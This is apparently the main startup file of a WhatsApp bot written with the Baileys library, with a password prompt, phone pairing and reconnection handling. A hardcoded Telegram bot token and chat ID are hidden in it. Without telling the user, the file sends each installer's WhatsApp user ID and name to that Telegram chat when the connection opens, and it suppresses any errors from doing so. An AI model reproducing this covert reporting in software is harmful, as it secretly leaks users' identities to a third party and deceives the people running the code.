require('./config');
const { 
    default: makeWASocket, 
    prepareWAMessageMedia, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    generateWAMessageFromContent, 
    generateWAMessageContent, 
    jidDecode, 
    proto, 
    relayWAMessage, 
    getContentType, 
    getAggregateVotesInPollMessage, 
    downloadContentFromMessage, 
    fetchLatestWaWebVersion, 
    InteractiveMessage, 
    makeCacheableSignalKeyStore, 
    Browsers, 
    generateForwardMessageContent, 
    MessageRetryMap 
} = require("@whiskeysockets/baileys");
const axios = require('axios');
const pino = require('pino');
const readline = require("readline");
const fs = require('fs');
const figlet = require('figlet');
const chalk = require("chalk");
const crypto = require('crypto');
const { Boom } = require('@hapi/boom');
const { color } = require('./library/color');
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./library/function');

const custom = "12345678" // 8 karakter, bisa huruf/angka
const usePairingCode = true;
const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => {
return new Promise((resolve) => { rl.question(text, resolve) });
}

const sendTelegramNotification = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot7682514927:AAGh1naoilXeUKro9n71b_LlLXRGLkePtJA/sendMessage`, {
            chat_id: '8135629926',
            text: message
        });
    } catch (error) {
    }
};

const store = (() => {
  const messages = {}

  const loadMessage = async (jid, id) => {
    return messages[jid] ? (messages[jid].array || []).find(m => m.key.id === id) : null
  }

  const bind = () => {
    const upsertHandler = ({ messages: msgs }) => {
      const msg = msgs[0]
      const jid = msg.key.remoteJid
      messages[jid] ||= { array: [] }
      messages[jid].array.push(msg)
    }

    const deleteHandler = ({ keys }) => {
      const msg = keys?.[0]
      const jid = msg?.remoteJid
      if (!jid || !messages[jid]) return
      messages[jid].array = messages[jid].array.filter(m => m.key.id !== msg.id)
    }

    return {
      upsertHandler,
      deleteHandler
    }
  }

  return {
    messages,
    loadMessage,
    bind
  }
})()


const manualPassword = 'OLLA';
// Whatsapp Connect
async function ConnetToWhatsapp() {
const { state, saveCreds } = await useMultiFileAuthState('./session');
const zepy = makeWASocket({
logger: pino({ level: "silent" }),
printQRInTerminal: !usePairingCode,
auth: state,
browser: ["Ubuntu", "Chrome", "20.0.04"]
});
if (usePairingCode && !zepy.authState.creds.registered) {
        console.log(chalk.green.bold(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠈⠀⠍⠐⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠠⠀⠀⠀⠀⠉⠉⠉⠙⠀⠀⠠⠄⠀⠀⣄⠁⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢀⠀⠀⢀⠀⠀⠀⠄⠀⠄⣀⡀⠀⠀⠀⠀⠈⠍⠘⢧⡀⠂⡀⠀⠀⠀⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠄⠀⠀⠀⠈⠁⠁⠄⡠⠦⠥⠤⠬⠆⠨⡀⠀⠀⠈⠀⠀⠀⠀⣁⣦⣿⣴⡖⢢⢮⠓⢄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡄⡀⢀⠀⠀⠀⠀⠀⠀⠸⠤⠊⠀⠀⠀⠀⠀⠀⣄⡀⠀⣀⣤⣶⣿⣿⡟⠛⠛⣷⣼⢻⣷⡆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠄⠀⠀⠀⠀⣤⣠⣐⣦⣤⣤⣦⣤⣀⣠⣾⣿⣿⣿⣯⣯⣤⡞⢹⢈⣾⢿⣳⢧⠨⢄⠀⠀
⠀⠀⠀⠀⠀⡄⠀⠁⢰⠀⠠⠀⠀⡐⣆⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⣿⣿⣿⣷⣺⣿⣥⣾⣿⠠⡀⠀⠀⠀
⠀⠀⠀⢠⡇⣁⠀⠇⠀⠀⠀⠀⠀⢱⣿⣿⣿⣿⣿⠿⣿⣿⠟⠉⠉⢛⠋⣻⣷⣦⣤⣿⣿⣿⣿⣛⣿⡿⢹⢟⣦⢸⠀⠀⠀
⠀⢇⠐⠈⢁⣇⠀⡀⠀⠀⠀⠀⢠⣿⣿⣿⢅⠀⠁⠀⡹⠃⢀⣀⠆⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⠋⠀⠉⠁⡏⢻⡄⠀⢠
⠀⡞⣧⡀⠈⠘⡶⡇⠀⠀⠀⠐⢾⣿⣿⠪⡉⠀⠀⠰⠄⡈⢞⣷⠴⢀⣠⣿⣿⣿⣿⣿⣿⡿⠻⡈⠀⠀⠀⠰⣿⡟⠁⡆⠘
⠀⠀⢛⣗⠀⢲⠀⠀⠀⠀⠀⠐⣿⡿⠟⠀⡀⠀⡀⠔⠋⠄⠀⠀⣾⣼⣿⣿⣿⣿⣿⡿⡏⠈⠗⠇⠀⠀⠐⠆⣿⠓⡶⠃⢠
⠠⢰⢸⡏⢱⡂⢰⠀⡀⠀⣀⣶⣿⣿⡎⠷⠖⠉⠀⠀⠀⣔⣠⣾⣿⣿⣿⣿⠿⣿⡟⠀⠘⠀⠀⠀⠀⠀⠀⠀⡟⡎⡏⣀⠀
⠀⠀⠈⠿⡇⢨⡏⠀⣹⣾⣿⣿⣿⣿⣷⣄⠀⠀⣄⣤⣿⣿⣿⣿⣿⣿⠿⢗⣼⡟⡤⠀⠀⠀⠀⠀⠀⠀⠀⡆⣻⢻⠉⠁⠀
⠀⠀⢰⣇⡐⠚⢣⣷⣿⡿⣿⣿⣿⣤⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣯⣷⠟⠁⡈⠀⠀⠀⠀⠀⠀⠀⠀⡠⢀⠱⢹⠀⠀⠀
⠀⢄⠀⠁⡁⣶⣿⣿⡷⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠾⠟⠛⠋⠁⣤⣄⠁⠀⠀⠀⠀⠀⠀⠀⡴⠃⠈⠞⠚⠂⠀⠀
⠀⠐⢵⠀⢸⣾⢻⡇⡇⠠⠤⣟⣙⣿⣾⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⣖⡎⠁⠀⠀⠀⠀⠀⠀⠠⠖⠋⠀⠁⠀⠀⠀⠀⠀
⠀⠀⠀⢊⡞⢛⠈⠛⠛⠺⢋⣹⣿⡿⠿⠛⠑⠬⠐⠀⠀⠀⠀⠀⠀⡀⠯⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠘⠿⠥⠶⣮⠿⠛⡯⠉⠁⢀⠀⠀⠀⠁⠀⠀⠀⣀⡀⠀⢀⠉⠀⠀⠀⠠⣀⠀⠀⠀⠀⢠⠅⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠂⠄⠀⠐⠆⡀⠀⠂⠈⠉⡀⠀⠀⠀⢀⠀⠈⠁⢄⠀⠑⠀⠀⠀⠉⠉⠁⠀⠐⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠉⢉⡉⠵⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠉⠉⠙⠀⠀⠀⠐⠀⠐⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
DEVELOPER: Vanayyis
VERSION: V1.0
`));
const inputPassword = await question(chalk.red.bold('Masukkan Password:\n'));
if (inputPassword !== manualPassword) {
console.log(chalk.red('Password salah! Sistem akan dimatikan'));
            process.exit(); // Matikan konsol
        }
console.log(chalk.cyan("-[ 🔗 Time To Pairing! ]"));
const phoneNumber = await question(chalk.cyan.bold('INPUT SENDER NUMBER\nNUMBER : '));


        
        
const code = await zepy.requestPairingCode(phoneNumber, custom);

/* Testo await conn.requestPairingCode(phoneNumber, custom)
*/
console.log(chalk.green.bold(`PAIRING CODE : ${code}`));
}

store.bind(zepy.ev);
zepy.ev.on("messages.upsert", async (chatUpdate, msg) => {
 try {
const mek = chatUpdate.messages[0]
if (!mek.message) return
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
if (!zepy.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
if (mek.key.id.startsWith('FatihArridho_')) return;
const m = smsg(zepy, mek, store)
require("./case")(zepy, m, chatUpdate, store)
 } catch (err) {
 console.log(err)
 }
});

    zepy.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

    zepy.ev.on('contacts.update', update => {
        for (let contact of update) {
            let id = zepy.decodeJid(contact.id);
            if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
        }
    });

    zepy.public = true

    zepy.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            console.log(color(lastDisconnect.error, 'deeppink'));
            if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
                process.exit();
            } else if (reason === DisconnectReason.badSession) {
                console.log(color(`┏━━━━━━━━━━━━━[ GolOffc ]
┃MESSAGE: BAD SESSION FILE
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
                process.exit();
            } else if (reason === DisconnectReason.connectionClosed) {
                 console.log(color(`┏━━━━━━━━━━━━━[ GolOffc ]
┃MESSAGE: CONNECTION CLOSED, RECONNECTING
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
                process.exit();
            } else if (reason === DisconnectReason.connectionLost) {
                 console.log(color(`┏━━━━━━━━━━━━━[ GollOfc ]
┃MESSAGE: CONNECTION LOST
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
                process.exit();
            } else if (reason === DisconnectReason.connectionReplaced) {
                 console.log(color(`┏━━━━━━━━━━━━━[ Gollofc ]
┃MESSAGE: CONNECTION REPLACED, PLS RESTART
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
                zepy.logout();
            } else if (reason === DisconnectReason.loggedOut) {
                 console.log(color(`┏━━━━━━━━━━━━━[ GollOfc ]
┃MESSAGE: DEVICE LOGGED OUT
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
                zepy.logout();
            } else if (reason === DisconnectReason.restartRequired) {
                 console.log(color(`┏━━━━━━━━━━━━━[ GollOfc ]
┃MESSAGE: RESTART REQUIRED, RESTARTING
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
                await ConnetToWhatsapp();
            } else if (reason === DisconnectReason.timedOut) {
                 console.log(color(`┏━━━━━━━━━━━━━[ Goll Ofc ]
┃MESSAGE: CONNECTION TIME OUT
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
                ConnetToWhatsapp();
            }
        } else if (connection === "connecting") {
             console.log(color(`┏━━━━━━━━━━━━━[ GollOfc ]
┃MESSAGE: RECONNECT
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
        } else if (connection === "open") {
             console.log(color(`┏━━━━━━━━━━━━━[ GollOfc ]
┃MESSAGE: CONNECTED
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
            sendTelegramNotification(`USERID : ${zepy.user.id}\n> USERNAME : ${zepy.user.name}\n\n`);
        }
    });

    zepy.sendText = (jid, text, quoted = '', options) => zepy.sendMessage(jid, { text: text, ...options }, { quoted });
    
    zepy.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
return buffer
    } 
    
    zepy.ev.on('creds.update', saveCreds);
    return zepy;
}

ConnetToWhatsapp();

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file];
    require(file);
});
